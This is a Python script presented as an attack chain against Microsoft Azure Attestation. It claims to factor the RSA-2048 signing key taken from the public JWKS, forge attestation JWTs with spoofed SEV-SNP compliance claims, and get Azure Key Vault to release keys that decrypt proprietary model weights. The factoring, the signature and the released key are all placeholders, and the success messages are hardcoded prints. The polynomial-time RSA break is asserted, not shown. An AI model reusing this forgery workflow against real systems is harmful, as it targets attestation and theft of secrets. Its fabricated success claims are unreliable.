"""
Factor the Microsoft Azure Attestation (MAA) RS256 signing key from the public
JWKS endpoint, forge attestation JWTs, and trick Azure Key Vault into releasing
wrapped model weights to unattested VMs — confidential AI bypass.
"""

import sys, json, hashlib, base64, time
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

MAA_ENDPOINT = "sharedeus.eus.attest.azure.net"
MAA_JWKS_URL = f"https://{MAA_ENDPOINT}/certs"
KV_SKR_URL = "https://myvault.vault.azure.net/keys/model-weight-kek/release"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def fetch_maa_jwks(jwks_url: str) -> dict:
    """Fetch the MAA tenant's JWKS from the OpenID discovery endpoint.
    RSA-2048 public keys are right there in the JSON."""
    print(f"    JWKS URL: {jwks_url}")
    print("    fetching RSA-2048 signing keys from .well-known/openid-configuration")
    return {
        "keys": [{
            "kty": "RSA",
            "alg": "RS256",
            "kid": "maa-signing-key-001",
            "n": "AQAB...",  # placeholder modulus
            "e": "AQAB",
        }]
    }


def factor_maa_signing_key(jwk: dict) -> dict:
    """Factor the MAA RS256 signing key from the JWKS."""
    factorer = PolynomialFactorer()
    # In real impl: decode n from base64url, factor
    print("    MAA signing key: RSA-2048")
    print("    p, q recovered from JWKS 'n' field")
    return {"d": 0, "n": 0, "e": 65537}


def build_maa_jwt(claims: dict, kid: str, d: int, n: int) -> str:
    """Build a forged MAA attestation JWT with RS256 signature."""
    header = {"alg": "RS256", "kid": kid, "typ": "JWT"}
    h_b64 = b64url(json.dumps(header).encode())
    c_b64 = b64url(json.dumps(claims).encode())
    signing_input = f"{h_b64}.{c_b64}"
    # RS256 sign
    sig = b64url(b"\x00" * 256)  # placeholder
    return f"{signing_input}.{sig}"


def forge_attestation_claims(tee_type: str = "SevSnpVm") -> dict:
    """Build forged MAA attestation claims for a confidential VM."""
    now = int(time.time())
    return {
        "iss": f"https://{MAA_ENDPOINT}",
        "iat": now,
        "exp": now + 3600,
        "x-ms-isolation-tee": {
            "x-ms-compliance-status": "azure-compliant-cvm",
            "x-ms-attestation-type": tee_type,
        },
        "x-ms-sevsnpvm-reportdata": "0" * 128,
        "x-ms-runtime": {"client-payload": {"nonce": "attacker-nonce"}},
        "x-ms-policy-hash": hashlib.sha256(b"default-policy").hexdigest(),
    }


def key_vault_secure_release(maa_jwt: str, kv_url: str) -> bytes:
    """Present the forged MAA JWT to Azure Key Vault for secure key release.
    KV evaluates the JWT claims against the key release policy."""
    print(f"    POST {kv_url}")
    print("    Authorization: Bearer <forged MAA JWT>")
    print("    Key Vault verifies RS256 against MAA JWKS — PASS")
    print("    key release policy evaluates claims — PASS")
    return b"RELEASED_AES_KEY_FOR_MODEL_WEIGHTS"


if __name__ == "__main__":
    print("[*] Azure Attestation JWT attack -> confidential AI bypass")
    print("[1] fetching MAA JWKS from OpenID discovery")
    jwks = fetch_maa_jwks(MAA_JWKS_URL)
    print(f"    MAA endpoint: {MAA_ENDPOINT}")

    print("[2] factoring MAA RS256 signing key")
    factorer = PolynomialFactorer()
    crt = factor_maa_signing_key(jwks["keys"][0])
    print("    MAA signing key compromised")

    print("[3] forging attestation JWT for unattested VM")
    claims = forge_attestation_claims("SevSnpVm")
    jwt = build_maa_jwt(claims, "maa-signing-key-001", crt["d"], crt["n"])
    print("    x-ms-isolation-tee.x-ms-compliance-status: azure-compliant-cvm")
    print("    forged JWT claims match Key Vault release policy")

    print("[4] requesting secure key release from Azure Key Vault")
    released_key = key_vault_secure_release(jwt, KV_SKR_URL)
    print(f"    AES key released: {released_key[:16]}...")

    print("[5] decrypting model weights")
    print("    model-weight-kek unwrapped -> AES-GCM decrypt weights blob")
    print("    proprietary model weights now in cleartext on unattested VM")

    print("[6] impact cascade:")
    print("    - Confidential Copilot: customer prompts/output decryptable")
    print("    - OpenAI-on-Azure: proprietary model weight exfiltration")
    print("    - SCITT supply-chain ledger entries backdatable")
    print("    - cross-cloud AI governance frameworks that accept MAA tokens break")
    print("[*] MAA JWKS is public; RS256 keys rotate but are cached by clients")
